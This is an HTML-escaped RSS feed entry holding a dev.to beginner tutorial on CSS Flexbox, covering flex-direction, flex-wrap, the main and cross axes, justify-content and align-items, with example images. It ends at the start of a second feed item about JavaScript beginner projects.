&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cKREb9bW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lsdd4iy435liovw2rh0u.jpg"&gt;&lt;img alt="2" src="https://res.cloudinary.com/practicaldev/image/fetch/s--iHMvbKQC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--cKREb9bW--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lsdd4iy435liovw2rh0u.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#use-the-raw-flexdirection-endraw-property"&gt;&lt;/a&gt;📌 Use the &lt;code&gt;flex-direction&lt;/code&gt; Property&lt;/h2&gt;
&lt;p&gt;Adding &lt;code&gt;display: flex&lt;/code&gt; to an element turns it into a flex container. This makes it possible to align any children of that element into rows or columns.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;flex-direction&lt;/code&gt; property specifies the direction of the items within the flex container&lt;/p&gt;
&lt;p&gt;You do this by adding the &lt;code&gt;flex-direction&lt;/code&gt; property to the parent item and setting it to &lt;code&gt;row&lt;/code&gt; or &lt;code&gt;column&lt;/code&gt;. Creating a row will align the children horizontally, and creating a column will align the children vertically.&lt;/p&gt;
&lt;p&gt;Other options for flex-direction are &lt;code&gt;row-reverse&lt;/code&gt; and &lt;code&gt;column-reverse&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Ih2CQbHP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s928brc75rg6xhx7r8lq.jpg"&gt;&lt;img alt="dir" src="https://res.cloudinary.com/practicaldev/image/fetch/s--yvRfeLbe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Ih2CQbHP--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s928brc75rg6xhx7r8lq.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Note: The default value for the &lt;code&gt;flex-direction&lt;/code&gt; property is &lt;code&gt;row&lt;/code&gt;. This is the reason when we used &lt;code&gt;display: flex&lt;/code&gt; on the boxes above they were aligned in a row automatically.&lt;/p&gt;
&lt;p&gt;After applying &lt;code&gt;row&lt;/code&gt;, &lt;code&gt;row-reverse&lt;/code&gt;, &lt;code&gt;column&lt;/code&gt; and &lt;code&gt;column-reverse&lt;/code&gt; in &lt;span&gt;&lt;code&gt;flex-direction&lt;/code&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;They all are pretty intuitive.&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-flexdirection-row-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;flex-direction: row&lt;/code&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qplDgxYs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9zwqvlfdz3wron3aayjh.jpg"&gt;&lt;img alt="row" src="https://res.cloudinary.com/practicaldev/image/fetch/s--zWp8TAh---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--qplDgxYs--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9zwqvlfdz3wron3aayjh.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-flexdirection-rowreverse-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;flex-direction: row-reverse&lt;/code&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--U3Xv9M83--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/82h7xrin7ufs712zfc2m.jpg"&gt;&lt;img alt="rowrev" src="https://res.cloudinary.com/practicaldev/image/fetch/s--l0JFdkN9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--U3Xv9M83--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/82h7xrin7ufs712zfc2m.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-flexdirection-column-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;flex-direction: column&lt;/code&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--U7-Meq-m--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikiz947ohrcktzb22obm.png"&gt;&lt;img alt="col" src="https://res.cloudinary.com/practicaldev/image/fetch/s--T_vu4W3g--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--U7-Meq-m--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikiz947ohrcktzb22obm.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-flexdirection-columnreverse-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;flex-direction: column-reverse&lt;/code&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9qIIBkX---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jbgjy04yhku0h98uvd8r.png"&gt;&lt;img alt="colrev" src="https://res.cloudinary.com/practicaldev/image/fetch/s--CsCUPgd4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--9qIIBkX---/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jbgjy04yhku0h98uvd8r.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#use-the-raw-flexwrap-endraw-property-to-wrap-a-row-or-column"&gt;&lt;/a&gt;📌 Use the &lt;code&gt;flex-wrap&lt;/code&gt; Property to Wrap a Row or Column&lt;/h2&gt;
&lt;p&gt;If we have a large number of elements in the flex container, it can destroy the width of elements.&lt;/p&gt;
&lt;p&gt;CSS flexbox has a feature to split a flex item into multiple rows (or columns). By default, a flex container will fit all flex items together. For example, a row will all be on one line.&lt;/p&gt;
&lt;p&gt;However, using the &lt;code&gt;flex-wrap&lt;/code&gt; property tells CSS to wrap items. This means extra items move into a new row or column. It persists the width of elements.&lt;/p&gt;
&lt;p&gt;The breakpoint of where the wrapping happens depends on the size of the items and the size of the container.&lt;br&gt;&lt;/p&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nt"&gt;parent&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nl"&gt;flex-wrap&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;wrap&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vimeo:&lt;/p&gt;

&lt;p&gt;CSS has options for the direction of the wrap:&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-nowrap-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;nowrap&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;this is the default setting and does not wrap items.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_Ar2XoH6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xiji8onoqbdeycdvpcr1.png"&gt;&lt;img alt="nowrap" src="https://res.cloudinary.com/practicaldev/image/fetch/s--S9s_nFec--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--_Ar2XoH6--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xiji8onoqbdeycdvpcr1.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-wrap-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;wrap&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;wraps items onto multiple lines from top-to-bottom if they are in rows and left to right if they are in columns.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XtWWxXSF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qfll050k1a9jitp1kov3.png"&gt;&lt;img alt="wrap" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_qnIMu4P--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--XtWWxXSF--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qfll050k1a9jitp1kov3.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-wrapreverse-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;wrap-reverse&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;wraps items onto multiple lines from bottom-to-top if they are in rows and right-to-left if they are in columns.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--p9zMCweN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rqky3jfcdqvvuz23b3ih.png"&gt;&lt;img alt="wrap-reverse" src="https://res.cloudinary.com/practicaldev/image/fetch/s--J7Y21paO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--p9zMCweN--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rqky3jfcdqvvuz23b3ih.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#mainaxis-and-crossaxis"&gt;&lt;/a&gt;📌 Main-Axis and Cross-Axis&lt;/h2&gt;
&lt;p&gt;We can align elements within Flexbox in accordance with these two axes.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Xw9MIx00--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oa75ny23dwlafq6bdatg.png"&gt;&lt;img alt="Axis" src="https://res.cloudinary.com/practicaldev/image/fetch/s--hzhtlrYm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Xw9MIx00--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oa75ny23dwlafq6bdatg.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To help you better understand:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Wv84d1Xl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yqlumm8j6rawwe039duj.jpg"&gt;&lt;img alt="axis2" src="https://res.cloudinary.com/practicaldev/image/fetch/s--3Hpzy_lZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Wv84d1Xl--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yqlumm8j6rawwe039duj.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Time to align flexible items within a flex container&lt;/p&gt;
&lt;p&gt;🔸 Justify-content: For horizontal alignment&lt;br&gt;🔸 Align-content: For vertical alignment&lt;/p&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#align-elements-using-the-raw-justifycontent-endraw-property"&gt;&lt;/a&gt;📌 Align Elements Using the &lt;code&gt;justify-content&lt;/code&gt; Property&lt;/h2&gt;
&lt;p&gt;Sometimes the flex items within a flex container do not fill all the space in the container. It is common to want to tell CSS how to align and space out the flex items a certain way.&lt;/p&gt;
&lt;p&gt;Fortunately, the &lt;code&gt;justify-content&lt;/code&gt; property has several options to do this. But first, it is important to understand the Main Axis and Cross Axis, which we did in the last section.&lt;/p&gt;
&lt;p&gt;Recall that setting a flex container as a row places the flex items side-by-side from left to right. A flex container set as a column places the flex items in a vertical stack from top-to-bottom.&lt;/p&gt;
&lt;p&gt;For each, the direction the flex items are arranged is called the &lt;span&gt;main axis&lt;/span&gt;. For a row, this is a horizontal line that cuts through each item. And for a column, the main axis is a vertical line through the items.&lt;/p&gt;
&lt;p&gt;There are several options for how to space the flex items along the line that is the main axis.&lt;/p&gt;
&lt;p&gt;Most commonly used ones are:&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-center-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: center&lt;/code&gt;
&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns all the flex items to the center inside the flex container.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--poahcXB5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j82pbmy3okcjjfx2guhp.png"&gt;&lt;img alt="center" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_gCxIWGM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--poahcXB5--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j82pbmy3okcjjfx2guhp.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-flexstart-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: flex-start&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the start of the flex container. For a row, this pushes the items to the left of the container. For a column, this pushes the items to the top of the container. This is the default alignment if no justify-content is specified.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2sJzrTql--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sm78fs3aquel79cnula4.png"&gt;&lt;img alt="flex-start" src="https://res.cloudinary.com/practicaldev/image/fetch/s--jbbhSftm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--2sJzrTql--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sm78fs3aquel79cnula4.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-flexend-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: flex-end&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the end of the flex container. For a row, this pushes the items to the right of the container. For a column, this pushes the items to the bottom of the container.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hEuAMkFW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/honqw7ch1fdd6j6uuoqw.png"&gt;&lt;img alt="flex-end" src="https://res.cloudinary.com/practicaldev/image/fetch/s--ceaYSZuv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--hEuAMkFW--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/honqw7ch1fdd6j6uuoqw.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Other options include:&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-spacebetween-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: space-between&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the center of the main axis, with extra space placed between the items. The first and last items are pushed to the very edge of the flex container. For example, in a row the first item is against the left side of the container, the last item is against the right side of the container, then the remaining space is distributed evenly among the other items.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AcuitWR5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3aj5wh44ma89v6tpvthm.png"&gt;&lt;img alt="space-between" src="https://res.cloudinary.com/practicaldev/image/fetch/s--4OXjNgaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--AcuitWR5--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3aj5wh44ma89v6tpvthm.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-spacearound-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: space-around&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;similar to space-between but the first and last items are not locked to the edges of the container, the space is distributed around all the items with a half-space on either end of the flex container.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--aeOkYcWQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kmynqmj4f6madnwwl9vl.png"&gt;&lt;img alt="space-around" src="https://res.cloudinary.com/practicaldev/image/fetch/s--xwImds0b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--aeOkYcWQ--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kmynqmj4f6madnwwl9vl.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-justifycontent-spaceevenly-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;justify-content: space-evenly&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Distributes space evenly between the flex items with a full space at either end of the flex container&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JYV6skU1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/je7a8uzo53l5sdwgvb68.png"&gt;&lt;img alt="space-evenly" src="https://res.cloudinary.com/practicaldev/image/fetch/s--LJ5RcP5a--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--JYV6skU1--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/je7a8uzo53l5sdwgvb68.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#see-the-code"&gt;&lt;/a&gt;👨‍💻 SEE THE CODE:&lt;/h4&gt;

&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#align-elements-using-the-raw-alignitems-endraw-property"&gt;&lt;/a&gt;📌 Align Elements Using the &lt;code&gt;align-items&lt;/code&gt; Property&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;align-items&lt;/code&gt; property is similar to &lt;code&gt;justify-content&lt;/code&gt;. Recall that the justify-content property aligned flex items along the main axis. For rows, the main axis is a horizontal line and for columns, it is a vertical line.&lt;/p&gt;
&lt;p&gt;Flex containers also have a cross-axis which is the opposite of the main axis. For rows, the cross axis is vertical and for columns, the cross axis is horizontal.&lt;/p&gt;
&lt;p&gt;CSS offers the &lt;code&gt;align-items&lt;/code&gt; property to align flex items along the &lt;span&gt;cross-axis&lt;/span&gt;. For a row, it tells CSS how to push the items in the entire row up or down within the container. And for a column, how to push all the items left or right within the container.&lt;/p&gt;
&lt;p&gt;The different values available for align-items include:&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-alignitems-center-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;align-items: center&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the center. For rows, this vertically aligns items (equal space above and below the items). For columns, this horizontally aligns them (equal space to the left and right of the items).&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ZvjvIvcC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y3uv87lqyuse8vmabf5r.png"&gt;&lt;img alt="center" src="https://res.cloudinary.com/practicaldev/image/fetch/s--KizlkJqz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--ZvjvIvcC--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y3uv87lqyuse8vmabf5r.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-alignitems-flexend-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;align-items: flex-end&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the end of the flex container. For rows, this aligns items to the bottom of the container. For columns, this aligns items to the right of the container.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--x3DYgc47--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/djvv7ez4elsmmdy03gig.png"&gt;&lt;img alt="flex-end" src="https://res.cloudinary.com/practicaldev/image/fetch/s--L4Y82NSC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--x3DYgc47--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/djvv7ez4elsmmdy03gig.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-alignitems-flexstart-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;align-items: flex-start&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to the start of the flex container. For rows, this aligns items to the top of the container. For columns, this aligns items to the left of the container.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--tyMFDVAf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/28zgh3a8twxw38qiv862.png"&gt;&lt;img alt="flex-start" src="https://res.cloudinary.com/practicaldev/image/fetch/s--o6xzAlEY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--tyMFDVAf--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/28zgh3a8twxw38qiv862.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-alignitems-stretch-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;align-items: stretch&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;stretch the items to fill the flex container. For example, rows items are stretched to fill the flex container top-to-bottom.&lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;p&gt;This is the default value if no align-items value is specified.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7mmD6h5x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/98zwd0833g4g5x0sjn6p.png"&gt;&lt;img alt="stretch" src="https://res.cloudinary.com/practicaldev/image/fetch/s--26Bji0l1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--7mmD6h5x--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/98zwd0833g4g5x0sjn6p.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#-raw-alignitems-baseline-endraw-"&gt;&lt;/a&gt;🔶 &lt;code&gt;align-items: baseline&lt;/code&gt;:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;aligns items to their baselines. Baseline is a text concept, think of it as the line that the letters sit on.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FtfJ4DZ3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zklsfo6ckkgh2hzai7r9.png"&gt;&lt;img alt="baseline" src="https://res.cloudinary.com/practicaldev/image/fetch/s--o7BKMY-M--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--FtfJ4DZ3--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zklsfo6ckkgh2hzai7r9.png"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>css</category>
      <category>webdev</category>
    </item>
    <item>
      <title>100+ Javascript Project For Beginners</title>
      <author>Rocky</author>
      <pubDate>Sun, 25 Jul 2021 16:31:41 +0000</pubDate>
